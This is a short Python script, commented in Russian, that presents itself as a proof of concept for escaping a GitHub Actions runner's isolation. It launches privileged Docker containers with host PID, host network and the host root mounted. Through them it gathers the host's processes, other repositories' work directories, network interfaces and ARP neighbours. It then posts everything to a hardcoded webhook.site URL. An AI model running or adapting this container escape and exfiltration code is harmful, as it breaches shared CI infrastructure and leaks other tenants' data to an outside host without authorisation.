import os
import subprocess
import requests

# Твой уникальный вебхук для сбора данных
WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"

def run_host_command(cmd_args):
    """Выполняет команду на хост-машине через Docker-побег с полным доступом к хосту и сети"""
    # --pid=host позволяет видеть процессы хоста, --net=host — сетевые интерфейсы
    base_cmd = ["docker", "run", "--rm", "--net=host", "--pid=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
    full_cmd = base_cmd + [cmd_args]
    try:
        return subprocess.check_output(full_cmd, stderr=subprocess.STDOUT).decode(errors='ignore')
    except subprocess.CalledProcessError as e:
        return f"ERROR (Exit Code {e.returncode}): {e.output.decode(errors='ignore')}"

def exploit_poc():
    print("[*] Запуск глубокого PoC анализа изоляции раннера...")
    
    payload = {
        "experiment_status": "DEEP_ISOLATION_CHECK",
        "host_processes": "",
        "host_work_directories": "",
        "host_network_interfaces": "",
        "local_network_ping_sweep": ""
    }

    # 1. Проверяем запущенные процессы на хосте (--pid=host)
    print("[*] Сканирование процессов на хосте...")
    payload["host_processes"] = run_host_command("ps aux")

    # 2. Проверяем, есть ли другие рабочие директории GitHub Actions на диске хоста
    print("[*] Поиск следов других репозиториев в /mnt/host/home/runner/work...")
    payload["host_work_directories"] = run_host_command("ls -la /mnt/host/home/runner/work/ 2>/dev/null || echo 'Not found'")

    # 3. Проверяем сетевые интерфейсы хоста
    print("[*] Анализ сетевых интерфейсов...")
    payload["host_network_interfaces"] = run_host_command("ip a")

    # 4. Быстрая проверка соседей в локальной подсети (ARP-таблица или пинг шлюза)
    print("[*] Проверка ARP-таблицы (соседей по локальной сети)...")
    payload["local_network_ping_sweep"] = run_host_command("arp -a")

    # Отправка отчета на Webhook.site
    print("[*] Отправка расширенного отчета на Webhook.site...")
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=15)
        print(f"[+] Отчет успешно отправлен! Статус: {response.status_code}")
    except Exception as e:
        print(f"[-] Ошибка отправки: {e}")

if __name__ == "__main__":
    exploit_poc()
